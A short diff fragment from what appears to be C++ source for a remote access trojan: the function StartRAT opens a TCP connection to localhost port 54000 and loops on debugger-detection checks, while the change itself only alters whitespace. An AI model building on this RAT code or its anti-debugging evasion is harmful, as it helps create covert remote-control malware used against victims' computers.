@@ -8,7 +8,7 @@ DWORD WINAPI StartRAT(LPVOID lpParam)
 {
 	TCPClient* conn = new TCPClient("127.0.0.1", 54000);
 	conn->start_connection();
-	
+
 	while (true)
 	{
 		if (IsDebuggerPresent() || isDebuggerAttached())
